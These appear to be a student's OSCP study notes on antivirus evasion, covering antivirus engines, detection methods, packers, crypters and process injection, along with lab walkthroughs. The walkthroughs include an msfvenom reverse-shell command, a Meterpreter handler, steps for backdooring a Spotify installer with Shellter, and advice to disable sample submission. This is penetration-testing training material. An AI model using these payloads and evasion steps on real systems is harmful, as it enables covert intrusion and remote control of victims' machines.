---
tags: OSCP Modules
---

# Module 15: Antivirus Evasion

> Attackers often disable or bypass antivirus software to compromise targets. As penetration testers, we must understand and recreate these techniques. This module covers AV architecture, detection methods, and evasion techniques — both on-disk (obfuscation, packers, crypters) and in-memory (thread injection, process hollowing, reflective DLL injection).

## Overview: Three Learning Units

1. **15.1 — Antivirus Software Key Components and Operations** — how AV works, engines, detection methods
2. **15.2 — Bypassing Antivirus Detections** — on-disk vs in-memory evasion techniques
3. **15.3 — AV Evasion in Practice** — testing best practices, PowerShell bypass, Shellter automation, capstone labs
4. **15.4 — Wrapping Up** — summary and further reading

---

## 15.1. Antivirus Software Key Components and Operations

### 15.1.1. Known vs Unknown Threats

**The signature-based model:** Antivirus originally operated on malware signatures—unique identifiers of known malware, ranging from simple file hashes to complex binary pattern matches. A signature language (YARA, open-sourced in 2014) allows querying of malware repositories like VirusTotal.

**The ML engine limitation:** Modern AV products include Machine Learning (ML) engines to detect unknown threats, but they require internet connectivity (cloud-based) and can't always run on isolated internal servers without impacting system resources.

**EDR evolution:** Endpoint Detection and Response (EDR) solutions complement AV by generating security-event telemetry and forwarding it to SIEM systems for centralized monitoring. AVs and EDRs are complementary, not mutually exclusive.

### 15.1.2. AV Engines and Components

A modern AV comprises **seven core components**:

1. **File Engine** — scheduled and real-time file scans. Real-time scans use kernel-level mini-filter drivers to detect new file operations.
2. **Memory Engine** — inspects process memory at runtime for known binary signatures or suspicious API calls (memory injection attacks).
3. **Network Engine** — inspects incoming/outgoing traffic on the local network interface; blocks C2 communications.
4. **Disassembler** — translates machine code to assembly, reconstructs program code sections, identifies encoding/decoding routines.
5. **Emulator/Sandbox** — isolated environment where malware can be safely unpacked/decoded and analyzed.
6. **Browser Plugin** — provides visibility into malicious content executing inside browsers.
7. **Machine Learning Engine** — cloud-enhanced detection of unknown threats using algorithms and metadata.

**Key point:** These engines work *simultaneously* with a signature database, ranking events as benign, malicious, or unknown.

### 15.1.3. Detection Methods

**Signature-based detection** — restricted-list technology. Scans filesystem for known malware signatures; quarantines matches. Weakness: changing one bit of a file produces a completely different hash (demonstrated with xxd and sha256sum).

**Heuristic-based detection** — uses rules and algorithms to analyze code (disassemble, decompile, step through instructions) looking for malicious patterns and API calls, not just byte sequences.

**Behavior-based detection** — dynamically analyzes binary behavior in an emulated environment (sandbox/VM), searching for malicious actions.

**Machine Learning detection** — employs ML algorithms on metadata and cloud-enhanced analysis. Example: Windows Defender has a client ML engine (local heuristics) and cloud ML engine (global metadata model). When the client engine is uncertain, it queries the cloud.

**Key insight:** Different AV products use different implementations of heuristic/behavior/ML detection, so each flags different code as malicious.

#### Quiz Q1: Disassembler Engine
**Q: Which AV engine is responsible for translating machine code into assembly?**

**A: Disassembler.** The disassembler engine reconstructs program code sections from machine code and identifies encoding/decoding routines, allowing the AV to unpack encrypted malware and analyze its true payload.

#### Quiz Q2: Behavior-Based Detection
**Q: Which AV detection method makes use of an engine that runs the executable file from inside an emulated sandbox?**

**A: Behavior-based detection.** This method dynamically executes the binary in an isolated environment (sandbox/VM) and monitors for malicious actions, as opposed to static signature or heuristic analysis.

#### Lab Q3: VirusTotal Scan (Hands-on, pending VM spin-up)
**Q: Start up VM #1 and connect via RDP to the Windows 11 machine. On the user's desktop find `malware.exe`. Upload it to http://www.virustotal.com and check the BEHAVIOR tab for the flag.**

**Status:** Flagged for hands-on VM walkthrough (see [**Hands-on Labs** section below](#hands-on-labs)).

---

## 15.2. Bypassing Antivirus Detections

Antivirus evasion falls into two categories: **on-disk** (modifying files on disk to evade file engine scans) and **in-memory** (avoiding disk writes entirely, reducing detection surface).

### 15.2.1. On-disk Evasion

**Packers** — originally designed to reduce executable size, they compress binaries into a new executable with a new binary structure, generating a new hash and evading hash-based AV signatures. Modern AV signatures have improved, so packers alone are insufficient.

**Obfuscators** — reorganize and mutate code to make reverse-engineering harder. Techniques include replacing instructions with semantically equivalent ones, inserting dead code, splitting/reordering functions. Primarily used for IP protection, marginally effective against signature-based detection. Modern obfuscators include runtime in-memory capabilities.

**Crypters** — cryptographically encrypt executable code with a decryption stub that restores the original code on execution. Decryption happens in-memory; only encrypted code remains on-disk. **Encryption is one of the most effective AV evasion techniques.**

**Commercial tools:** The Enigma Protector is a notable commercial tool for bypassing antivirus via protection mechanisms originally designed for anti-copy.

#### Quiz Q1: Obfuscation
**Q: Which on-disk evasion technique makes use of code made by spurious instructions and that is not part of the main execution?**

**A: Obfuscators.** They insert irrelevant (dead code) and spurious instructions to make the code harder to analyze without changing its functionality.

### 15.2.2. In-memory Evasion

**Remote Process Memory Injection** — inject payload into another valid PE (not malicious) using Windows APIs:
  - `OpenProcess()` — obtain a HANDLE to the target process
  - `VirtualAllocEx()` — allocate memory in the remote process
  - `WriteProcessMemory()` — copy malicious payload to allocated memory
  - `CreateRemoteThread()` — execute payload in a separate thread

**Reflective DLL Injection** — load a DLL from process memory (not disk). Challenge: LoadLibrary doesn't support in-memory DLL loading; attackers must write their own API.

**Process Hollowing** — launch a non-malicious process in suspended state, remove its image from memory, replace it with a malicious executable image, resume execution. Malicious code runs instead of the legitimate process.

**Inline Hooking** — modify memory and introduce a hook (instruction redirecting execution) into a function to point to malicious code. Upon malicious execution, flow returns to the modified function and resumes. Common in rootkits; requires admin privileges.

#### Quiz Q1: WriteProcessMemory
**Q: When performing Remote Process Injection, which API is responsible for copying the shellcode into the target thread?**

**A: WriteProcessMemory.** This API copies the malicious payload to the memory allocated by VirtualAllocEx in the remote process.

#### Quiz Q2: Crypters > Packers
**Q: Between packers and crypters, which one provides the highest level of stealth?**

**A: Crypters.** Crypters encrypt the payload and only decrypt it in-memory, leaving no unencrypted code on-disk. Packers change the binary structure and hash but don't encrypt, making them more vulnerable to signature detection. Crypters are foundational to modern malware evasion.

---

## 15.3. AV Evasion in Practice

### 15.3.1. Testing for AV Evasion — Best Practices

**VirusTotal trade-off:** While VirusTotal provides quick scan results against 60+ AV engines, it forwards samples to AV vendors for analysis. After submission, vendors analyze the sample via sandbox and ML engines and release detection signatures within hours, rendering the bypass unusable in real-time.

**Kleenscan.com alternative:** Scans against 30 AV engines without sharing samples with vendors. Offers 4 free scans/day; additional scans available for a fee. Use when you don't know the target's AV vendor.

**Best practice: Build a test VM** — If you know the target AV (e.g., Windows Defender, Avira), build a dedicated VM that mirrors the target environment. Test locally without submitting samples.

**Disable automatic sample submission:**
  - Windows Defender: Settings → Virus & threat protection → Manage Settings → toggle off "Automatic Sample Submission"
  - This prevents cloud ML engines from analyzing your bypass and building detection signatures
  - Only enable sample submission after you're confident the bypass is effective (and only if the target has it enabled)

**Verify internet connectivity:** Both cloud protection and automatic sample submission require internet. Check if the target environment has restricted internet access; some production servers have limited connectivity, disabling advanced AV features.

**Prefer custom code:** AV signatures are extracted from malware samples. The more novel and diversified your code, the fewer existing detections will match. Avoid reusing public exploit code or well-known payload patterns.

### 15.3.2. Evading AV with Thread Injection (PowerShell In-Memory Injection)

**Context:** We'll evade Avira Free Security v1.1.68.29553 on Windows 11 using PowerShell-based in-memory injection. The key advantage: scripts are interpreted text, not easily fingerprinted like binary files. AV signatures often target variable/function names and logic, but these can be changed without recompilation.

#### Step 1: Generate a PowerShell Reflection Payload

PowerShell reflection scripts allocate unmanaged memory, decode base64-encoded shellcode, transfer it to allocated memory, and build a dynamic assembly to execute the injected payload.

**What we're doing:** Use msfvenom to generate a reverse shell in PowerShell reflection format (psh-reflection). This format includes randomly generated variable and function names (obfuscation) that differ each generation, helping evade static string-signature detection.

**Command to generate payload:**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection
```

**Expected output (abbreviated):**
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of psh-reflection file: 2960 bytes
...
function xf {
        Param ($nfCl, $vf)
        $uaQP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        return $uaQP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($uaQP.GetMethod('GetModuleHandle')).Invoke($null, @($nfCl)))), $vf))
}
...
```

The script includes:
- DLL imports: `VirtualAlloc`, `CreateThread` (from kernel32.dll), `memset` (from msvcrt.dll)
- Random variable names (`xf`, `nfCl`, `uaQP`, etc.) to evade signature detection
- Base64-encoded shellcode decoder and dynamic assembly builder

**Hands-on:** [Pending VM #1 walkthrough — see **Hands-on Labs** section](#hands-on-labs).

#### Lab Q1: VirtualAlloc API
**Q: Which API have we used in our script to allocate memory for the shellcode?**

**A: VirtualAlloc.** This Windows API allocates memory in the current process's address space (or `VirtualAllocEx` for remote process injection). The function signature in the script is:
```csharp
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
```

#### Execution Flow (Conceptual)

1. Save the generated PowerShell script as `bypass.ps1`
2. Transfer to target Windows 11 machine
3. Set PowerShell execution policy (if restricted): `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
4. Start a netcat listener on Kali: `nc -lvnp 443`
5. Run the script: `.\bypass.ps1`
6. Script allocates memory, injects shellcode, creates a thread to execute it
7. Reverse shell connects back to Kali listener

**VirusTotal scan result (as of module authoring):** 25/63 AV products flagged the script; Avira did not.

**Key points:**
- Scripts are harder to fingerprint than binaries (interpreted, not structured PE format)
- Randomly generated variable names defeat static string-signature detection
- Scripts can be easily modified without recompilation if detected
- Modern ML engines may still detect behavioral patterns; EDR systems can alert on suspicious PowerShell activity

**Hands-on:** [Pending VM #1 walkthrough](#hands-on-labs).

### 15.3.3. Automating AV Evasion with Shellter

Rather than manually writing evasion code, **Shellter** automates the process by performing dynamic shellcode injection into legitimate PE files.

#### How Shellter Works

1. **Analyzes the target PE** — thoroughly examines the binary structure and execution paths
2. **Determines injection points** — identifies where shellcode can be injected without using traditional PE-modification techniques (which AV engines easily detect)
3. **Leverages the PE Import Address Table (IAT)** — uses existing IAT entries to locate memory-allocation, data-transfer, and code-execution functions
4. **Injects and obfuscates** — injects the shellcode and obfuscates both the payload and decoder before injection
5. **Stealth Mode (optional)** — attempts to restore the original PE execution flow after payload execution, avoiding suspicion

**Shellter Pro** supports 32 and 64-bit binaries with stealthier anti-AV features (paid version).

#### Installation

```bash
# Install Shellter
sudo apt install shellter

# Install wine (compatibility layer for running Windows apps on Linux)
sudo apt install wine
sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32

# For ARM processors:
sudo apt install wine
sudo dpkg --add-architecture amd64
sudo apt install -y qemu-user-static binfmt-support
sudo apt-get update && apt-get install wine32
```

#### Basic Shellter Workflow (Automated Example)

1. **Launch Shellter:** `shellter` (launches a wine-based console)
2. **Select Auto mode** — Shellter automatically selects injection points
3. **Choose target PE** — provide path to a benign executable (e.g., Spotify installer: `/home/kali/Downloads/SpotifyFullWin10-32bit.exe`)
4. **Enable Stealth Mode** — restores execution flow of the PE after payload execution
5. **Select payload** — choose from listed payloads (Meterpreter, custom, etc.)
6. **Configure payload options** — set LHOST/LPORT for reverse shell
7. **Verify injection** — Shellter tests the injection in-memory
8. **Transfer to target** — copy the backdoored PE to Windows machine
9. **Setup listener** — on Kali, start a Meterpreter handler
10. **Execute on target** — run the backdoored PE; it appears legitimate but executes malicious payload
11. **Receive shell** — catch the reverse shell on the listener

#### VirusTotal Scan Result

A Shellter-injected Spotify installer scanned cleanly on Avira's quick scan (before execution), because:
- Shellter obfuscates both payload and decoder
- The injection doesn't modify PE section permissions or create new sections (signature red flags)
- Uses existing IAT entries (legitimate-looking code flow)

#### Meterpreter Setup (from module)

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```

**Expected output:**
```
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.50.1
LPORT => 443
[*] Started reverse TCP handler on 192.168.50.1:443
```

#### Execution on Target

When the user runs the backdoored Spotify installer, Meterpreter connects back:
```
[*] Sending stage (175174 bytes) to 192.168.50.62
[*] Meterpreter session 1 opened (192.168.50.1:443 -> 192.168.50.62:52273)
meterpreter > shell
Process 6832 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.739]
...
C:\Users\offsec\Desktop> whoami
client01\offsec
```

#### Lab Q1: Stealth Mode
**Q: Which Shellter option is responsible for restoring the execution flow of the backdoored binary and therefore avoids any unwanted suspicion?**

**A: Stealth Mode.** When enabled, Stealth Mode attempts to restore the original PE execution flow after the payload executes, so the legitimate application appears to run normally (e.g., Spotify installer shows its installation window), avoiding suspicion.

#### Capstone Lab 1: PuTTY + COMODO AV on VM #1
**Status:** Flagged for hands-on walkthrough.

**Lab requirements:**
- Use Shellter to inject a Meterpreter reverse shell into a 32-bit PuTTY executable
- Transfer the backdoored PuTTY.exe to Module Exercise VM #1 (COMODO antivirus)
- Verify AV does not flag the file
- Setup Meterpreter listener on Kali
- Execute the backdoored PuTTY on the target; FTP server on the target auto-executes .exe files in its root directory every few seconds
- Obtain a reverse shell
- **FTP note:** Set FTP session as active mode; enable binary encoding

#### Capstone Lab 2: Veil + Weaponized PowerShell + COMODO v12 on VM #2
**Status:** Flagged for hands-on walkthrough.

**Lab requirements:**
- Research and install the **Veil framework** (open-source tool for weaponizing PowerShell scripts)
- Use Veil to convert a PowerShell AV-bypass script into an executable .bat file (batch script)
- Reason: The original PowerShell script cannot be double-clicked by users—it would open in Notepad. Veil automates the conversion to a .bat file that executes the PowerShell script when double-clicked.
- Transfer the .bat file to Module Exercise VM #2 (COMODO v12.2.2.8012)
- Verify AV does not flag the file
- Setup listener on Kali
- FTP server auto-executes .bat files in its root directory every few seconds
- Obtain a reverse shell
- **FTP note:** Set FTP session as active mode; enable binary encoding

---

## 15.4. Wrapping Up

This module covered:
- **AV architecture:** seven core engines (file, memory, network, disassembler, emulator/sandbox, browser plugin, ML) and their roles
- **Detection methods:** signature-based, heuristic-based, behavior-based, ML-based
- **On-disk evasion:** packers, obfuscators, crypters (crypters are most effective)
- **In-memory evasion:** remote process injection, reflective DLL injection, process hollowing, inline hooking
- **Testing best practices:** VirusTotal vs Kleenscan, disabling sample submission, building test VMs, preferring custom code
- **Practical bypasses:** PowerShell thread injection (in-memory, interactive), Shellter automation (on-disk obfuscation)

**Further reading:**
- Microsoft article: "FinFisher exposed: A researcher's tale of defeating traps, tricks, and complex virtual machines"
- Emeric Nasi's paper on advanced evasion techniques

---

## Hands-on Labs

### Lab Summary

This module has **3 quiz questions** (answered above) and **4 hands-on labs** requiring VM spin-up:

| Lab | VM | Task | Status |
|-----|-----|------|--------|
| Q3: VirusTotal Scan | VM #1 (Windows 11, Avira) | Upload malware.exe to VirusTotal, check BEHAVIOR tab for flag | Pending |
| PowerShell Thread Injection | VM #1 (Windows 11, Avira) | Generate psh-reflection payload, set execution policy, run bypass.ps1, catch reverse shell on Kali nc listener | Pending |
| Shellter + Spotify | VM #1 (Windows 11, Avira) | Install Shellter/wine on Kali, inject Meterpreter into Spotify installer, transfer to VM, execute, verify Meterpreter session | Pending |
| Capstone 1: PuTTY + COMODO | Module Exercise VM #1 (COMODO AV) | Shellter + PuTTY, FTP auto-exec, reverse shell | Pending |
| Capstone 2: Veil + COMODO v12 | Module Exercise VM #2 (COMODO v12.2.2.8012) | Install Veil framework, weaponize PowerShell as .bat, FTP auto-exec, reverse shell | Pending |

---

## Outstanding Sections

- [ ] **15.1.1 Known vs Unknown Threats:** done (theory)
- [ ] **15.1.2 AV Engines and Components:** done (theory)
- [ ] **15.1.3 Detection Methods:** done (quiz Q1 & Q2 answered), Q3 VirusTotal lab pending VM spin-up
- [ ] **15.2.1 On-disk Evasion:** done (quiz Q1 answered)
- [ ] **15.2.2 In-memory Evasion:** done (quiz Q1 & Q2 answered)
- [ ] **15.3.1 Testing for AV Evasion:** done (best practices theory)
- [ ] **15.3.2 Evading AV with Thread Injection:** done (PowerShell theory & VirtualAlloc Q1 answered), hands-on pending VM spin-up
- [ ] **15.3.3 Automating AV Evasion:** done (Shellter theory, Stealth Mode Q1 answered), Shellter hands-on pending VM spin-up, Capstone Lab 1 & 2 pending VM spin-up
- [ ] **15.4 Wrapping Up:** done (summary)

---

#### Tags: #Module15 #AntivirusEvasion #AVBypass #PowerShell #Shellter
